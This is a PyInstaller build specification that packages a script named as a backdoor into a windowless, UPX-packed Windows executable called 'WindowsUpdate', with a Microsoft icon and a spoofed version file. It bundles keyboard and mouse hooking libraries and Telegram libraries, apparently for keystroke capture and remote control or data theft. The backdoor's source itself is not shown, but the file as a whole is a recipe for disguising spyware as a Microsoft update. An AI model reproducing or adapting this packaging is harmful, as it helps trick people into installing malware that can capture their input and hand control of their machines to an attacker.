# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['C:\\Users\\Al-kc\\AppData\\Local\\Temp\\tmp68pntbtk\\backdoor_20250122_084629.py'],
    pathex=[],
    binaries=[('C:\\Users\\Al-kc\\AppData\\Local\\Programs\\Python\\Python311\\python*.dll', '.')],
    datas=[('C:\\Users\\Al-kc\\AppData\\Local\\Programs\\Python\\Python311\\python.exe', '.')],
    hiddenimports=['pynput.keyboard._win32', 'pynput.mouse._win32', 'telegram', 'telegram.ext'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='WindowsUpdate',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version='C:\\Users\\Al-kc\\Desktop\\tools\\CIAbackdoor\\windows_update.txt',
    icon=['C:\\Users\\Al-kc\\Desktop\\tools\\CIAbackdoor\\microsoft.ico'],
)
